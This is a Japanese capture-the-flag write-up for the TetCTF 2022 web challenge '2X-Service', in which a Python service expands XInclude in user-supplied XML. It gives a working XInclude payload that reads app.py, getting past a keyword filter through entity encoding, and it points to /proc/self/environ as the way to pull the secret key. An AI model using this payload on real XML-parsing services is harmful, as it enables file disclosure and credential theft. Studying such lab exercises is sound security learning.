---
layout: chall
ctf_name: TetCTF 2022
problem_name: 2X-Service
genre: web
solved_date: 2022-01-04
during_ctf: false
tag: [xml, procfs]
---

### 概要

XML をパースし、 xpath で指定したノードを出力するサービスが与えられる。本質部分はおおよそ以下の通り。

```py
app.config['SECRET_KEY'] = XXXXXXXSECRETXXXXXXXX

xml = input()
if "text" in xml.lower(): exit()
res = ''
root = ElementTree.fromstring()
ElementInclude.include(root)
for elem in root.findall(input()):
    if elem.text != "":
        res += elem.text + ", "
print('result', res[:-2])
```

[!details:コード:(!src:app.py:c)]

### 解法

まず、`ElementInclude.include(root)` が[何をしているか](https://docs.python.org/ja/3/library/xml.etree.elementtree.html#xinclude-support)確認する。どうやら、特定のタグを用いることで外部の XML ファイルを読み込めるようだ。属性として `parse="text"` を指定するとパースをせずにテキストノードとして読み込んでくれる。サニタイジングは URL エンコードで回避可能である。
FLAG はソースファイルにあるようなので、以下のようにして app.py を読み込んだ。

```
<a xmlns:xi="http://www.w3.org/2001/XInclude"><b><xi:include href="app.py" parse="te&#120;t" /></b></a>
```

すると、秘匿されていた部分は

```
app.config['SECRET_KEY'] = os.environ.get('KEY')
```

であると分かった。環境変数は procfs の /proc/self/environ より読み出せるので、同様にこれを読み込めば良い。
